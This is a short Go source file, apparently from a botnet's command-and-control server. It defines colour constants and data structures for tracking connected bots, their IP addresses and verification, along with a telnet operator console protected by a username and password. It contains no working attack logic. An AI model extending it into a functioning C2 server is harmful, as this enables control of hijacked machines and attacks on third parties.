package cnc

import (
	"net"
	"sync"
)

const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Cyan   = "\033[36m"
	Reset  = "\033[0m"
)

type CNC struct {
	ListenAddr     string
	ListenPort     string
	ServerProtocol string

	OnlineMap map[string]*BotInfo
	MapLock   sync.RWMutex

	exec chan string
}

type TelnetServer struct {
	UserName         string
	PassWord         string
	TelnetListenAddr string
	TelnetListenPort string
	server           *CNC
}

type BotInfo struct {
	Conn               net.Conn
	IpAddr             string
	ConnStats          bool
	ExitChan           chan bool
	BotsVerify         string
	BotsVerifyCallback string
	OlineBot           chan string
	OfflineBot         chan string
	server             *CNC
}
